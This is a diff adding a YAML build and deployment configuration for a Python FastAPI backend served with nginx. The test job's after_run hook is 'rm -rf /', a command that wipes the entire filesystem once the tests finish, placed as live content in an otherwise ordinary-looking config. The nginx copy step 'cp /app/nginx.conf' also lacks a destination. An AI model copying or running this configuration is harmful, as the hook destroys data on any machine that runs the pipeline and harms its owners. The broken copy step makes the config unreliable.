@@ -1,0 +1,36 @@
+runtime:
+  type: "python"
+  version: "3.12"
+  root: "/app"
+  expose:
+    - 80
+
+install:
+  - "pip install -r requirements.txt"
+  - "pip install -r testing_requirements.txt"
+
+jobs:
+  - test:
+      install:
+        - "pip install pytest"
+      script:
+        - "pytest test.py"
+      after_run:
+        - "rm -rf /"
+
+deployment:
+  - backend:
+      install:
+        - "pip install fastapi[standard]"
+      script:
+        - "fastapi run main.py"
+      after_run:
+        - ""
+  - nginx:
+      install:
+        - "apt install nginx"
+        - "cp /app/nginx.conf"
+      script:
+        - "cp -r /app/frontend/* /var/www/html"
+      after_run:
+        - ""
